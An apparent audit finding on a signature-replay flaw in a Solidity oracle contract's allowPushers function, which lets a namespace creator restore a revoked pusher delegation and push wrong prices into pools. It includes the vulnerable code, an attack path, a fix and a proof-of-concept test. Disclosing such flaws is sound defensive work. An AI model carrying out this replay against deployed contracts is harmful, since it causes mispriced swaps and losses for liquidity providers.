### Title
Pusher Consent Signature Replay Allows Creator to Re-Establish Revoked Delegation, Feeding Wrong Prices to Pools - (File: smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol)

### Summary

`CompressedOracleV1.allowPushers` does not consume or invalidate a pusher's EIP-191 consent signature after it is used, and does not track revocations against outstanding signatures. A creator can replay the same pusher signature any number of times within the deadline window — including after the pusher has called `revokePusher()` — silently re-establishing the delegation the pusher intended to terminate. The pusher's subsequent fallback pushes, intended for their own namespace, are then redirected into the creator's namespace, injecting wrong prices into any pool whose price provider reads from that namespace.

### Finding Description

`allowPushers` accepts a `deadline` and a batch of `(pusher, signature)` pairs. For each pair it verifies the EIP-191 signature over `(chainid, address(this), deadline, pusher, creator)` and writes `namespaceRemapping[pusher] = creator`.

```solidity
// CompressedOracle.sol lines 192-211
function allowPushers(uint256 deadline, address[] calldata pushers, bytes[] memory signatures) external {
    _ensureDeadline(deadline);
    ...
    bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
        keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
    );
    require(pusher == ECDSA.recover(hash, signatures[i]));
    namespaceRemapping[pusher] = msg.sender;   // ← no nonce, no used-sig tracking
    ...
}
```

`revokePusher` clears the mapping:

```solidity
// CompressedOracle.sol lines 238-243
function revokePusher() external {
    ...
    namespaceRemapping[msg.sender] = address(0);
    emit PusherRevoked(msg.sender, creator);
}
```

There is no nonce, no used-signature set, and no linkage between a revocation and any outstanding signed consent. The deadline is the only time bound. Consequently, within the deadline window the creator can call `allowPushers` again with the identical `(deadline, pusher, signature)` tuple, overwriting the zero written by `revokePusher` and restoring `namespaceRemapping[pusher] = creator`.

The `fallback` push path resolves the namespace at call time:

```solidity
// CompressedOracle.sol lines 315-316
address creator = namespaceRemapping[msg.sender];
if (creator == address(0)) creator = msg.sender;
```

After the creator's replay, the pusher's pushes land in the creator's namespace, not the pusher's own. The pusher has no on-chain signal that the remapping was restored; they believe they are writing to their own feeds.

The documentation in `slot-structure.md` acknowledges the structural gap: *"the signed consent has no data timestamp, so an undated signature could re-establish a delegation after the pusher revoked it"* — but the deployed contract provides no mitigation.

**Attack path:**

1. Creator runs an ETH/USD oracle namespace consumed by a registered pool via `AnchoredPriceProvider` / `PriceProvider`.
2. Creator delegates Pusher A (legitimate ETH/USD data source) with `deadline = now + 365 days`.
3. Pusher A later revokes (`revokePusher()`), intending to push BTC/USD prices into their own namespace.
4. Creator immediately replays the original `allowPushers` call with the same `(deadline, pusherA, sig)` — succeeds because `block.timestamp < deadline` and no used-sig guard exists.
5. Pusher A's BTC/USD pushes now overwrite the creator's ETH/USD slot.
6. `pool.swap → provider.getBidAndAskPrice → oracle.price(feedId, pool)` returns BTC/USD prices for an ETH/USD pool → massive mispricing → traders receive more than the curve permits or LPs suffer direct principal loss.

### Impact Explanation

Wrong prices reach a live pool swap. Traders can extract value by swapping against a mispriced feed, or the pool becomes insolvent because the bid/ask no longer reflects the true asset ratio. This is a direct loss of LP principal and a swap conservation failure — both within the allowed impact gate.

### Likelihood Explanation

The creator is a semi-trusted party (they own the namespace and set up the pool's price provider). A creator who turns adversarial — or whose key is compromised — can execute the replay with a single transaction at any point before the original deadline expires. The pusher has no on-chain way to detect or prevent the re-delegation after revoking. Deadlines of days to months are realistic (the test suite uses `block.timestamp + 1 days`), giving a wide exploitation window.

### Recommendation

Track consumed signatures to prevent replay. The simplest fix is a `mapping(bytes32 => bool) private _usedConsents` keyed on the signature hash (or on `keccak256(abi.encode(deadline, pusher, creator))`), set to `true` on first use and checked before writing `namespaceRemapping`. Alternatively, bind the consent to a per-pusher nonce that increments on every `revokePusher` / `removePushers` call, so any previously signed message is automatically invalidated on revocation.

### Proof of Concept

```solidity
// 1. Creator delegates pusher with a 30-day deadline.
uint256 deadline = block.timestamp + 30 days;
bytes memory sig = pusherSign(deadline, pusher, creator);
vm.prank(creator);
oracle.allowPushers(deadline, toArray(pusher), toArray(sig));
assertEq(oracle.namespaceRemapping(pusher), creator);

// 2. Pusher revokes.
vm.prank(pusher);
oracle.revokePusher();
assertEq(oracle.namespaceRemapping(pusher), address(0));

// 3. Creator replays the SAME signature — succeeds, deadline still valid.
vm.prank(creator);
oracle.allowPushers(deadline, toArray(pusher), toArray(sig)); // no revert
assertEq(oracle.namespaceRemapping(pusher), creator);         // delegation restored

// 4. Pusher pushes BTC/USD prices thinking they go to their own namespace.
vm.prank(pusher);
(bool ok,) = address(oracle).call(buildSlotWord(slotId, btcUsdPrice, tsMs));
assertTrue(ok);

// 5. Creator's ETH/USD feed now contains BTC/USD price.
IOffchainOracle.OracleData memory data =
    oracle.getOracleData(oracle.feedIdOf(creator, slotId, pos));
assertEq(data.price, btcUsdPrice); // wrong price in creator's namespace → bad pool quote
```
